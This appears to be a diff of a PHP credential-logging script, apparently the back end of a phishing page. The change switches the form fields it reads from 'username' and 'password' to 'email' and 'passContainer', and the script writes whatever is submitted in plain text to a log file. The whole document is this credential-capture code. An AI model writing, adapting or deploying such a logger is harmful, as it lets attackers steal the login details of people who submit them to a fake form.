@@ -1,8 +1,8 @@
 <?php
 
 $path = __DIR__ . "/log.txt";
-$dataname = "Username: " . $_POST['username'] . "\n";
-$datapass = "Pass: " . $_POST['password'] . "\n";
+$dataname = "Username: " . $_POST['email'] . "\n";
+$datapass = "Pass: " . $_POST['passContainer'] . "\n";
 file_put_contents($path, $dataname);
 file_put_contents($path, $datapass, FILE_APPEND);
 
